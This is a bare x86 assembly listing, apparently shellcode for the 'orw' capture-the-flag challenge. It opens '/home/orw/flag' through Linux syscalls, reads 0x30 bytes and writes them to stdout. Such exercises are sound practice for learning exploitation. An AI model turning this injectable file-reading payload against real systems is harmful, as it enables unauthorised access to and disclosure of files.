xor ecx,ecx                
mov eax, 0x5               
push ecx                   
push 0x67616c66            
push 0x2f77726f            
push 0x2f656d6f            
push 0x682f2f2f            
mov ebx, esp               
xor edx, edx               
int 0x80 

mov eax, 0x3            
mov ecx, ebx               
mov ebx, 0x3
mov dl, 0x30
int 0x80

mov eax, 0x4               
mov bl, 0x1               
int 0x80 
